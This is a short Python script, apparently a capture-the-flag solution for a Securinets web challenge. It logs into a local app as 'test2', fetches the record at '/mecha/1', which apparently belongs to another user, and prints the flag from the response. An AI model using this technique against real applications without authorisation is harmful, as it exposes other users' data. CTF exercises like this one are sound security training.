import requests
import os

URL='http://localhost:8080'


session = requests.Session()
with requests.Session() as s:
    login_resp= s.post(URL+'/login',data={"username":"test2","password":"test2"})
    mecha_resp= s.get(URL+'/mecha/1')

    start_flag_index=mecha_resp.text.index('securinets')
    end_flag_index=mecha_resp.text.index('}')
    print(mecha_resp.text[start_flag_index:end_flag_index+1])

